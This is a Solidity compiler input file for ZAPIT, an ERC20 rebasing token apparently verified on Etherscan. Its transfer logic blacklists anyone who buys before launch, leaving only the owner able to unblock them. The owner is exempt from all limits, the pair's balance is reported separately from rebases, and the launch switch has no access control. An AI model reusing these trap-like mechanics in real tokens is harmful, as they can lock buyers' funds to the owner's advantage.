{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/3_Ballot.sol": {
      "content": "/**\n *Submitted for verification at Etherscan.io on 2021-07-26\n*/\n\n// SPDX-License-Identifier: Unlicensed\n\npragma solidity ^0.6.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nlibrary Address {\n    function isContract(address account) internal view returns (bool) {\n        bytes32 codehash;\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n        assembly { codehash := extcodehash(account) }\n        return (codehash != accountHash && codehash != 0x0);\n    }\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return _functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        return _functionCallWithValue(target, data, value, errorMessage);\n    }\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n        require(isContract(target), \"Address: call to non-contract\");\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n        if (success) {\n            return returndata;\n        } else {\n            if (returndata.length > 0) {\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    address private _previousOwner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n} \n\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\ncontract ZAPIT  is Context, IERC20, Ownable {\n    using SafeMath for uint256;\n    using Address for address;\n    \n    IUniswapV2Router02 public uniswapV2Router;\n    address public uniswapV2Pair;\n    \n    string private _name = 'ZAPIT';\n    string private _symbol = 'ZAPIT';\n    uint8 private _decimals = 18;\n    \n    uint256 private constant MAX_UINT256 = ~uint256(0);\n    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 1 * 1e7 * 1e18;\n    uint256 private constant TOTAL_GONS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);\n    \n    uint256 public constant MAG = 10 ** 18;\n    uint256 public  rateOfChange = MAG;\n\n    uint256 private _totalSupply;\n    uint256 public _gonsPerFragment;\n    \n    mapping(address => uint256) public _gonBalances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    mapping(address => bool) public blacklist;\n    mapping (address => uint256) public _buyInfo;\n\n    uint256 public _percentForTxLimit = 1; //2% of total supply;\n    uint256 public _percentForRebase = 5; //5% of total supply;\n    uint256 public _timeLimitFromLastBuy = 5 minutes;\n    \n    uint256 private uniswapV2PairAmount;\n    \n    bool public _live = false;\n    \n    \n    constructor () public {\n        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;\n        _gonBalances[_msgSender()] = TOTAL_GONS;\n        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\n        \n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\n\n        emit Transfer(address(0), _msgSender(), _totalSupply);\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        if(account == uniswapV2Pair)\n            return uniswapV2PairAmount;\n        return _gonBalances[account].div(_gonsPerFragment);\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n    \n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n    \n    function rebasePlus(uint256 _amount) private {\n         _totalSupply = _totalSupply.add(_amount.div(5));\n        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"ERC20: Transfer amount must be greater than zero\");\n        \n        if (from != owner() && to != owner()) {\n            uint256 txLimitAmount = _totalSupply.mul(_percentForTxLimit).div(100);\n            \n            require(amount <= txLimitAmount, \"ERC20: amount exceeds the max tx limit.\");\n            \n            if(from != uniswapV2Pair) {\n                require(!blacklist[from] && !blacklist[to], 'ERC20: the transaction was blocked.');\n                require(_buyInfo[from] == 0 || _buyInfo[from].add(_timeLimitFromLastBuy) < now, \"ERC20: Tx not allowed yet.\");\n                \n                if(to != address(uniswapV2Router) && to != uniswapV2Pair)\n                    _tokenTransfer(from, to, amount, 0);\n                else\n                    _tokenTransfer(from, to, amount, 0);\n            }\n            else {\n                if(!_live)\n                    blacklist[to] = true;\n                \n                require(balanceOf(to) <= txLimitAmount, 'ERC20: current balance exceeds the max limit.');\n                \n                _buyInfo[to] = now;\n                _tokenTransfer(from, to, amount, 0);\n\n                uint256 rebaseLimitAmount = _totalSupply.mul(_percentForRebase).div(100);\n                uint256 currentBalance = balanceOf(to);\n                uint256 newBalance = currentBalance.add(amount);\n                if(currentBalance < rebaseLimitAmount && newBalance < rebaseLimitAmount) {\n                    rebasePlus(amount);\n                }\n            }\n        } else {\n            _tokenTransfer(from, to, amount, 0);\n        }\n    }\n    \n    function _tokenTransfer(address from, address to, uint256 amount, uint256 taxFee) internal {\n        if(to == uniswapV2Pair)\n            uniswapV2PairAmount = uniswapV2PairAmount.add(amount);\n        else if(from == uniswapV2Pair)\n            uniswapV2PairAmount = uniswapV2PairAmount.sub(amount);\n        \n        uint256 burnAmount = amount.mul(taxFee).div(100);\n        uint256 transferAmount = amount.sub(burnAmount);\n        \n        uint256 gonTotalValue = amount.mul(_gonsPerFragment);\n        uint256 gonValue = transferAmount.mul(_gonsPerFragment);\n        \n        _gonBalances[from] = _gonBalances[from].sub(gonTotalValue);\n        _gonBalances[to] = _gonBalances[to].add(gonValue);\n        \n        emit Transfer(from, to, transferAmount);\n        \n        if(burnAmount > 0)\n            emit Transfer(from, address(0x0), burnAmount);\n    }\n    \n    function updateLive() external {\n        if(!_live) {\n            _live = true;\n        }\n    }\n    \n    function unblockWallet(address account) public onlyOwner {\n        blacklist[account] = false;\n    }\n    \n    function updatePercentForTxLimit(uint256 percentForTxLimit) public onlyOwner {\n        require(percentForTxLimit >= 1, 'ERC20: max tx limit should be greater than 1');\n        _percentForTxLimit = percentForTxLimit;\n    }\n}"
    }
  }
}